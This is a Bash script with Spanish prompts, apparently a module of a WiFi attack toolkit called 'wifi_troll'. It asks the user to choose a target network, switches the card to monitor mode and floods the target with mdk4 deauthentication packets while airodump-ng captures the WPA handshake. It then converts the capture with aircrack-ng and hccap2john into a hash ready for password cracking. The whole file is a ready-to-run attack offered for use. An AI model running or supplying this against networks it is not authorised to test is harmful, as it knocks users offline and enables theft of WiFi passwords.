#!bin/bash

source requisitos/0.sh

#Comprobacion de que la Tarjeta de Red tenga puesto el Modo Managed y si no lo cambia + rellenar contendor $interfaz#
card
echo
read -p "[*] Escribe la Interfaz de la Tarjeta de Red (Ej: wlan0): " interfaz
check_wifi_mode $interfaz
check_managed $mode
#Fin#
Title
echo "[5] Extraer el  HandShake  de una Red Wifi"
echo
echo "[#] Copia el BSSID y CHAN del Wifi objetivo, puede tardar hasta 1 minuto en aparecer la Red Objetivo"
echo
echo
sudo gnome-terminal --geometry 100x24+1300+20 -- bash -c "sudo nmcli dev wifi list && sleep 999999999" &
read -p "[*] Copia el BSSID del Wifi Objetivo y pegelo a continuacion: " bssid
read -p "[*] Copia el Canal (CHAN) del Wifi Objetivo y pegelo a continuacion: " ch
sudo pkill gnome-terminal

#Activar Modo Monitor
ActMonitor
#Fin#
Title
echo

if ! [ -d requisitos/resultados ]
	then
		mkdir requisitos/resultados
fi
if [ -d requisitos/resultados/$bssid/handshake ]
	then
		sudo rm -r requisitos/resultados/$bssid/handshake
fi
if [ -d requisitos/resultados/Hash* ]
	then
		sudo rm -r requisitos/resultados/Hash*
fi
if ! [ -d requisitos/resultados/$bssid ]
	then
		mkdir requisitos/resultados/$bssid
fi
if ! [ -d requisitos/resultados/$bssid/handshake ]
	then
		mkdir requisitos/resultados/$bssid/handshake
fi

clear
sudo gnome-terminal --geometry 82x24+1300+20 -- bash requisitos/5.2.sh &
sudo gnome-terminal --geometry 82x24+1300+1000 -- bash -c "echo -e '\033[0;35m[#] 10 Segundos para empezar el Ataque:\033[0m' && sleep 10 && sudo timeout 30s mdk4 $interfaz2 d -B $bssid -c $ch; echo -e '\033[0m'" &
sudo airodump-ng -c $ch --bssid $bssid $interfaz2 --band abg -w $bssid
Title
echo "[#] Ultimos ajustes y Resultado"
sudo pkill gnome-terminal >/dev/null
sudo rm -r $bssid-01.csv
sudo rm -r $bssid-01.log.csv
sudo rm -r $bssid-01.kismet.csv
sudo rm -r $bssid-01.kismet.netxml
mv $bssid-01.cap requisitos/resultados/$bssid/handshake
echo
echo "------------------------------------------------------------"
echo "↓ Resultados--> $bssid | "`sudo aircrack-ng -J requisitos/resultados/$bssid/handshake/$bssid-02 requisitos/resultados/$bssid/handshake/$bssid-01.cap | awk 'NF==6{print $3}'`" ↓"
echo "------------------------------------------------------------"
echo
sudo aircrack-ng -J requisitos/resultados/$bssid/handshake/$bssid-02 requisitos/resultados/$bssid/handshake/$bssid-01.cap | awk 'FNR>= 5{print}' | awk 'FNR<= 3{print}'
sudo aircrack-ng -J requisitos/resultados/$bssid/handshake/$bssid-02 requisitos/resultados/$bssid/handshake/$bssid-01.cap | awk 'FNR>= 20{print}'
sudo hccap2john requisitos/resultados/$bssid/handshake/$bssid-02.hccap > requisitos/resultados/$bssid/Hash.$bssid-03
echo "El HandShake se a guardado en: requisitos/resultados/$bssid/handshake/$bssid-01.cap"
echo
read -p "[*] Pulsa (Enter) para Salir:" exit
Title
#Desactivar Modo Monitor
DesaMonitor
#Fin#
echo
echo
echo "#####################"
echo "[1] Volver al Menu"
echo "[2] Volver a ejecutar"
echo "[3] Salir"
echo "#####################"
echo
read -p "Elige una opcion: " opc2
	case $opc2 in
			1 )	bash wifi_troll.sh
				;;
			2 )	bash requisitos/5.sh
				;;
			3 )	exit
				;;
			* )	echo
				echo "$RRPLY No es una opcion valida"
	esac
